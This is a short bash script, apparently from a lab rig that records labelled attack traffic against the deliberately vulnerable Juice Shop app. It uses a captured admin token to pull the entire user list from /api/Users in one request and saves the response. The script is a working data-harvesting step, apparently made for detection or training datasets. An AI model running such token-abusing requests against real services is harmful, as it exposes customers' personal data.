#!/usr/bin/env bash
# ATK-09 variant a: with the admin token (setup: lib/admin-session.sh) pulls the whole user list from
# the REST API. Juice Shop doesn't paginate it, so it's one request. curl's own user agent (loud).
# Responses are captured (lib/capture.sh, D-25), so the converter sees which customers left.
# Runs inside the rig's tools container only (recording/record.sh).
# tool: curl 8.x
# label: loud: one GET /api/Users with the admin token, curl user agent
set -eu
. /attacks/lib/capture.sh
req http://10.66.0.10/api/Users -H "Authorization: Bearer $(cat /out/admin.token)"
